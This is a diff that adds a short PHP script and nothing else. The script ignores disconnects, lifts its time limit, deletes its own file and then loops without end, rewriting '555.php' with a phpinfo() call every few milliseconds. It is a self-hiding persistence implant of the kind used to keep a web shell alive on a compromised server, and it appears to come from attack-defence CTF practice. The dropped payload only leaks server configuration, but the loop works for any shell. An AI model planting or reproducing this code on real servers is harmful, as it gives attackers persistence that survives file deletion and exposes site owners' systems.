@@ -1,0 +1,11 @@
+<?php
+ignore_user_abort(true);
+    set_time_limit(0);
+    @unlink(__FILE__);
+    $file = '555.php';
+    $code = '<?php phpinfo();?>';
+    while (1){
+        file_put_contents($file,$code);
+        usleep(5000);
+    }
+?>
